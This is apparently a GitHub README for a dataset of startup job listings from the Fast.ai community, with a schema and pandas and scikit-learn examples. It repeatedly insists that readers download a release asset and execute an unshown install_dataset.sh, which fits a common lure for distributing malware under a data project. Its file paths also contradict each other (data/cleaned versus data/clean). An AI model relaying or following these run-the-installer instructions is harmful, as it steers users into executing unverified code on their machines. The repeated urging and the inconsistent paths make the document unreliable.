https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases

[![Download Release](https://img.shields.io/badge/Release-Download-blue?style=for-the-badge&logo=github)](https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases)

# Fast AI Startup Jobs Dataset — Comprehensive Hiring Signals

![data-and-startup](https://images.unsplash.com/photo-1522202176988-66273c2fd55f?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3)

A practical, well-structured dataset built from startup job listings found in the Fast.ai community. This repo collects job posts, company signals, role text, and structured fields to help you run analyses, build models, and produce visual dashboards. Use this dataset for hiring analytics, job-market research, skill-gap studies, and prototype ML pipelines.

Release download: https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases  
You must download the release asset from the Releases page and execute the provided script to unpack and install the dataset files.

---

Table of contents
- About the dataset 🚀
- Files and structure 📂
- Schema and fields 📋
- Quickstart — download and run ▶️
- Common workflows and examples 🛠️
  - Exploratory data analysis
  - Text processing and embeddings
  - Role classification
  - Salary and compensation analysis
  - Skills extraction and clustering
- Notebooks and demo pipelines 📓
- Data quality and cleaning steps 🧹
- Privacy, ethics, and license ⚖️
- How to cite 📚
- Contributing and roadmap 🔧
- Maintainers and contact 👥
- FAQ ❓
- References and resources 🔗

---

About the dataset 🚀

This dataset collects startup job posts gathered from Fast.ai forums, community job boards, and public company pages. It focuses on roles relevant to AI teams and technical startups. Each record pairs raw job text with structured tags. You can use this collection to measure hiring trends, model role descriptions, and test NLP models for job classification or skill extraction.

Key goals
- Provide a clean, labeled dataset of startup jobs.
- Include text and structured fields to enable many tasks.
- Package release assets for straightforward download and execution.
- Support reproducible research and prototyping.

Primary uses
- Research on hiring trends in AI startups.
- Benchmarking NLP models on job text.
- Building search or recommendation systems for roles.
- Visual dashboards for startup hiring signals.

Images and icons in this README come from Unsplash and public icon services. Use them in your demos and documentation under their license terms.

---

Files and structure 📂

The release provides a packaged asset. After you download and execute the provided script, you will see the following layout:

- data/
  - raw/
    - fastai_jobs_raw.jsonl           # Raw scraped job posts (JSON Lines)
    - fastai_jobs_html/               # Optional raw HTML snapshots
  - cleaned/
    - jobs_clean.csv                  # Cleaned, tabular CSV
    - jobs_clean.parquet              # Column-typed Parquet for faster I/O
    - jobs_augmented.parquet          # Augmented file with embeddings and tags
  - splits/
    - train.csv
    - val.csv
    - test.csv
- notebooks/
  - 01-explore.ipynb
  - 02-text-prep.ipynb
  - 03-embeddings.ipynb
  - 04-role-classification.ipynb
  - 05-dashboard.ipynb
- scripts/
  - install_dataset.sh               # Script to unzip and place files
  - run_preproc.py                   # Python script to run cleaning pipeline
  - build_embeddings.py              # Script to compute and store embeddings
- models/
  - baseline-sklearn.pkl
  - transformer-finetuned.pt
- LICENSE.md
- CITATION.cff
- README.md

The release asset includes install_dataset.sh. Download that asset and execute it to unpack all files and place them under data/. The install script runs small checks and sets correct file permissions.

Schema and fields 📋

The cleaned CSV and Parquet files contain the following columns. Each field uses plain types (string, integer, float, timestamp).

Core fields
- id (string): Unique record identifier.
- source (string): Source site or board (e.g., fastai-forum, company-site).
- post_url (string): Permalink to the original post or job listing.
- collected_at (timestamp): Time the post was scraped.
- title (string): Job title as posted.
- location (string): Text location field (city, country, remote).
- remote (boolean): True if job allows remote work.
- full_text (text): Concatenated job description, requirements, and benefits.
- salary_text (string): Raw salary text if present.
- salary_min (float): Estimated minimum salary in USD when available.
- salary_max (float): Estimated maximum salary in USD when available.
- employment_type (string): e.g., full-time, contract, internship.
- experience_level (string): e.g., junior, mid, senior, lead.
- company_name (string)
- company_stage (string): e.g., seed, series-a, series-b, public.
- company_size (int): Number of employees when available.
- industry (string): Primary industry tag.
- tags (array[string]): Human or automated tags (e.g., ml-engineer, frontend).
- skills (array[string]): Extracted skill tokens (e.g., python, pytorch).
- embeddings (vector): Optional dense vector embedding for full_text.
- cleaned (boolean): True when record passed validation.

Quality flags
- dedup_id (string): Group id for duplicate detection.
- requires_review (boolean): True if human review flagged issues.

Provenance and audit fields
- raw_source_id (string): Original post id from the source.
- snapshot_html (string): Path to archived HTML if applicable.
- preprocessing_version (string): Pipeline version used to clean.

Data types in parquet preserve types for fast loading. The dataset supplies train/val/test splits that match distributions and maintain temporal consistency where possible.

Quickstart — download and run ▶️

1) Visit the releases page
- Go to the release page and download the asset:
  https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases

2) Download and execute
- The release contains install_dataset.sh. Download that file and run it.
- The release contains a prepackaged dataset archive and an install script. You must download the asset and execute the script to extract and place files into the data/ directory.

Example commands (Linux / Mac)
```bash
# Download the release asset manually or via curl/wget
# Then make the installer executable and run it

chmod +x install_dataset.sh
./install_dataset.sh
```

The installer will:
- Unpack compressed files under data/
- Verify checksums
- Place notebooks and scripts in the repo
- Optionally build a small sample index for quick tests

If the release URL does not work in your environment, you can visit the Releases section on GitHub for manual download: https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases

If you find an asset that matches your OS, download it and execute the included installer script. The script will guide you through paths and optional dependency installs.

Common workflows and examples 🛠️

I. Exploratory data analysis (EDA)
- Goal: Understand distributions of roles, remote vs on-site, compensation ranges, and skills frequency.

Sample analysis steps (pandas)
```python
import pandas as pd

df = pd.read_parquet("data/clean/jobs_clean.parquet")
print(df.shape)
print(df['company_stage'].value_counts())
print(df['remote'].value_counts())

# Top skills
from collections import Counter
skills = Counter()
df['skills'].dropna().apply(lambda s: skills.update(s))
print(skills.most_common(50))
```

Common EDA visuals
- Histogram of job postings over time
- Bar chart of top skills
- Boxplots of estimated salary ranges by experience level
- Heatmap of skills vs role clusters

II. Text processing and embeddings
- Goal: Convert free text to dense vectors for clustering or classification.

Suggested pipeline
- Lowercase and normalize whitespace.
- Remove HTML and markdown.
- Tokenize with a subword tokenizer or spaCy depending on model choice.
- Optionally remove stop words.
- Compute embeddings with a Transformer model or sentence transformer.

Example using sentence-transformers
```python
from sentence_transformers import SentenceTransformer
import pandas as pd
model = SentenceTransformer('all-MiniLM-L6-v2')

df = pd.read_parquet("data/clean/jobs_clean.parquet")
texts = df['full_text'].fillna(df['title']).tolist()
embeddings = model.encode(texts, show_progress_bar=True)
# Save embeddings to parquet or numpy
```

III. Role classification
- Goal: Predict role categories (e.g., ML Engineer, Researcher, Data Scientist, Software Engineer).

Approach
- Use train/val/test splits provided.
- Start with TF-IDF + logistic regression as a baseline.
- Move to a Transformer fine-tune for improved accuracy.
- Use stratified splits to keep label distribution consistent.

Baseline example (scikit-learn)
```python
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline
from sklearn.metrics import classification_report

train = pd.read_csv('data/splits/train.csv')
val = pd.read_csv('data/splits/val.csv')
vec = TfidfVectorizer(max_features=20000, ngram_range=(1,2))
clf = LogisticRegression(max_iter=1000)
pipe = Pipeline([('tfidf', vec), ('clf', clf)])
pipe.fit(train['full_text'], train['label'])
pred = pipe.predict(val['full_text'])
print(classification_report(val['label'], pred))
```

IV. Salary and compensation analysis
- Goal: Estimate salary distributions and normalize ranges to USD.

Steps
- Parse salary_text with regex.
- Convert currencies using simple exchange table or a fixed date fetch.
- Infer ranges when only single value present.
- Use role and company stage as covariates for modeling.

Salary parsing example
```python
import re
def parse_salary(s):
    if not isinstance(s, str):
        return (None, None)
    match = re.search(r'(\$|USD)\s?(\d+[,\d]*)', s)
    if match:
        val = int(match.group(2).replace(',', ''))
        return (val, val)
    return (None, None)
```

V. Skills extraction and clustering
- Goal: Build a normalized skill taxonomy for job matching.

Approach
- Use rule-based extraction for common tokens (Python, PyTorch, AWS).
- Use embeddings for fuzzy skill normalization (e.g., "pytorch" vs "pyTorch").
- Cluster roles by skill vectors to surface similar positions.

Skills extraction sample
```python
import re
KNOWN_SKILLS = ['python', 'pytorch', 'tensorflow', 'sql', 'aws', 'docker', 'kubernetes']
def extract_skills(text):
    text = text.lower()
    return [s for s in KNOWN_SKILLS if s in text]
```

Notebooks and demo pipelines 📓

This repo includes Jupyter notebooks that walk through most tasks:
- 01-explore.ipynb — Visual EDA and summary stats.
- 02-text-prep.ipynb — Cleaning and tokenization steps.
- 03-embeddings.ipynb — Building sentence embeddings and nearest neighbor queries.
- 04-role-classification.ipynb — Baseline models and evaluation.
- 05-dashboard.ipynb — Simple Dash/Plotly dashboard to surface hiring signals.

Each notebook uses pandas and commonly used ML libraries. The notebooks assume you run install_dataset.sh first and point to the data/ directory.

Model development tips
- Reuse the provided train/val/test splits.
- Log experiments with lightweight tools like MLflow or Weights & Biases.
- Use mixed precision when fine-tuning Transformer models to save GPU memory.

Data quality and cleaning steps 🧹

This dataset applies a standard cleaning pipeline. The major steps:
- Deduplication: Remove duplicate posts by title + company or by exact full_text.
- HTML removal: Strips markup and normalizes whitespace.
- Language detection: Keep English-only posts or tag language for multilingual tasks.
- Salary normalization: Parse numeric salary mentions and map to USD.
- Skill extraction: Build normalized skill lists from raw text.
- Tag normalization: Map human tags to a controlled vocabulary.

Flags and manual review
- The dataset marks records requiring review for ambiguous cases.
- The installer will place such records under data/raw/reviews/ for manual inspection.

Common cleaning heuristics
- Remove boilerplate text like "apply at our site" if it masks real content.
- Merge repeated bullets into single paragraphs for better token counts.
- Keep the original raw file for audit.

Privacy, ethics, and license ⚖️

Ethics
- This dataset collects publicly posted job listings. You should respect the source site's terms of service.
- Do not use the dataset to target individuals or for activities that harm privacy.
- Use the dataset for research and analysis that benefits the community.

Privacy handling
- Personal contact details, when present in raw text, are redacted during cleaning by default.
- The release excludes private emails and direct contact fields.

License
- The dataset ships with LICENSE.md. The default release license follows an open data license model suitable for research.
- Check LICENSE.md in the release for exact terms before reuse in production.

How to cite 📚

The release includes a CITATION.cff file. Use that file to cite the dataset in papers and presentations. A sample citation format:

Musadiq Muneeb (Year). fast-ai-startup-jobs-dataset. GitHub. https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases

Contributing and roadmap 🔧

We accept contributions that improve data quality, add labels, or enhance tooling. Areas that need help:
- Additional skill normalization rules.
- More sources and scraping patterns for new job boards.
- More labeled data for role fine-grained classification.
- Benchmarks for baseline models.

How to contribute
- Fork the repo and open a pull request.
- Add tests for any data parsing functions you modify.
- When adding data sources, include scraping scripts and a short readme for provenance.

Roadmap highlights
- Add more sources beyond Fast.ai posts.
- Build a live data pipeline for near-real-time job signals.
- Provide a hosted demo with search and role matching.
- Add a public leaderboard for role classification tasks.

Maintainers and contact 👥

Primary maintainer
- musadiqmuneeb — GitHub: https://github.com/musadiqmuneeb

Community
- Use the GitHub Discussions tab for general questions and feature requests.
- Open issues for bug reports and data errors.

FAQ ❓

Q: Where do I get the dataset files?
A: Visit the releases page and download the release asset. Then execute the included installer script:
https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases

Q: The link does not work for me. What now?
A: If the release link does not work, visit the Releases section on GitHub and download the appropriate asset manually. The Releases tab lists available versions and assets.

Q: Is this dataset live or static?
A: Releases provide static snapshot versions. The project aims to publish periodic releases. Check the release notes for changes.

Q: Can I use the dataset for commercial projects?
A: Check LICENSE.md in the release for permitted uses. The license dictates commercial reuse rules.

Q: Does the dataset include contact data?
A: Personal contact details are redacted during cleaning. The raw archive may include original HTML snapshots for audit, but the cleaned release excludes direct personal identifiers.

Appendix A — Suggested pipelines and commands

Environment setup (recommended)
```bash
# Create virtualenv
python -m venv venv
source venv/bin/activate

# Install core libs
pip install -r requirements.txt
```

Quick data load
```python
import pandas as pd
df = pd.read_parquet("data/clean/jobs_clean.parquet")
print(df.head())
```

Build embeddings (example)
```bash
python scripts/build_embeddings.py \
  --input data/clean/jobs_clean.parquet \
  --output data/clean/jobs_augmented.parquet \
  --model all-MiniLM-L6-v2 \
  --batch-size 128
```

Train a Transformer classifier (sketch)
```bash
python -m examples.train_transformer \
  --train data/splits/train.csv \
  --val data/splits/val.csv \
  --text-column full_text \
  --label-column label \
  --out models/transformer-finetuned.pt \
  --epochs 3 \
  --batch-size 16
```

Appendix B — Data field derivation rules

Derivation: salary_min / salary_max
- Extract numbers and ranges with regex.
- Convert to USD using the conversion table with values fixed at collection date.
- If a single annual amount appears, assign both min and max to that value.
- If hourly mention detected, normalize to annual assuming 40 hours/week and 52 weeks.

Derivation: experience_level
- Map common tokens:
  - junior, entry -> junior
  - mid, intermediate -> mid
  - senior, lead -> senior
  - manager, director -> leadership

Derivation: company_stage
- Use keywords in company descriptions and external sources to tag stage:
  - seed, pre-seed
  - series-a, series-b, series-c
  - late-stage, public

Appendix C — Example analysis: Top skills over time

You can compute trends in skill mentions to track rising demand.

Sample code
```python
import pandas as pd
from collections import Counter

df = pd.read_parquet("data/clean/jobs_clean.parquet")
df['month'] = pd.to_datetime(df['collected_at']).dt.to_period('M')

def top_skills_by_month(month):
    rows = df[df['month'] == month]
    skills = Counter()
    rows['skills'].dropna().apply(lambda s: skills.update(s))
    return skills.most_common(20)

print(top_skills_by_month('2024-01'))
```

Appendix D — Example model evaluation metrics

For role classification, report:
- Accuracy
- Macro F1
- Per-class precision and recall
- Confusion matrix

For clustering, report:
- Silhouette score
- Cluster size distribution
- Manual inspection of top keywords per cluster

Appendix E — Known limitations

- The dataset relies on public posts and may bias toward companies that post openly.
- Salary fields remain noisy when companies use ranges or omit currency.
- Skill extraction may miss niche or misspelled tokens. Contributions to the skill list help improve recall.

Acknowledgments and sources ✨

Images
- Unsplash for general images: https://unsplash.com

Tools and libraries
- pandas, scikit-learn, sentence-transformers, spaCy, PyTorch

References and resources 🔗

- Fast.ai community and forums for the original posts and community context.
- GitHub Releases: https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases

Release note reminder
- You must download and execute the release asset from the Releases page:
  https://github.com/musadiqmuneeb/fast-ai-startup-jobs-dataset/releases

The release contains install scripts, dataset archives, and checksums. Download the asset and run the installer to place the dataset under data/ and to enable the notebooks and sample pipelines.